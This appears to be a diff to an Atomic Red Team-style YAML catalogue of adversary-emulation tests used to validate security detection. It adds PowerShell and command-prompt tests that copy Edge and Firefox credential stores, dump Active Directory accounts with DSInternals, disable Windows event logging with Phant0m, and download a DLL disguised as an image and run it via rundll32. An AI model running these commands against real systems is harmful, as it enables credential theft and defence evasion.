@@ -1558,11 +1558,46 @@ credential-access:
       executor:
         name: powershell
         command: 'Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination
-          $env:temp -Force
+          $env:temp -Force -Recurse
 
 '
-        cleanup_command: Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
-          Ig
+        cleanup_command: 'Remove-Item -Path "$env:temp\Profiles" -Force -ErrorAction
+          Ignore -Recurse
+
+'
+    - name: Simulating access to Windows Edge Login Data
+      auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
+      description: |
+        Simulates an adversary accessing encrypted credentials from Edge web browser's login database.
+        more info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Edge must be installed
+
+'
+        prereq_command: if (Test-Path "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
+          {exit 0} else {exit 1}
+        get_prereq_command: '"Installation is not implemented as Edge is a part of
+          windows"
+
+'
+      - description: 'Edge login data file must exist
+
+'
+        prereq_command: if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default")
+          {exit 0} else {exit 1}
+        get_prereq_command: "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process
+          $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
+      executor:
+        name: powershell
+        command: 'Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination
+          $env:temp\Edge -Force -Recurse
+
+'
+        cleanup_command: Remove-Item -Path "$env:temp\Edge" -Force -ErrorAction Ignore
+          -Recurse
   T1552.002:
     technique:
       created: '2020-02-04T12:58:40.678Z'
@@ -1773,6 +1808,36 @@ credential-access:
           "exit"
 
 '
+    - name: Run DSInternals Get-ADReplAccount
+      auto_generated_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e
+      description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon
+        successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)
+        CrowdStrike StellerParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName argument default %logonserver%
+          type: String
+          default: $ENV:logonserver.TrimStart("\")
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DSInternals must be installed
+
+'
+        prereq_command: |
+          $RequiredModule = Get-Module -Name DSInternals -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force
+
+'
+      executor:
+        command: 'Get-ADReplAccount -All -Server #{logonserver}
+
+'
+        name: powershell
+        elevation_required: false
   T1556.001:
     technique:
       external_references:
@@ -24994,6 +25059,37 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Makes Eventlog blind with Phant0m
+      auto_generated_guid: 3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741
+      description: 'Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: exe version of Phant0m
+          type: Path
+          default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Phant0m.exe must exist on disk at specified location (#{file_name})
+
+'
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
+      executor:
+        command: 'PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+
+'
+        cleanup_command: 'echo "Sorry you have to reboot"
+
+'
+        name: command_prompt
   T1562.007:
     technique:
       external_references:
@@ -36204,6 +36300,34 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Execution of non-dll using rundll32.exe
+      auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
+      description: "Rundll32.exe running non-dll \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: Non-dll file
+          type: String
+          default: C:\Users\$env:username\Downloads\calc.png
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Non-dll file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: powershell
+        command: 'rundll32.exe #{input_file}, StartW'
   T1134.005:
     technique:
       external_references:
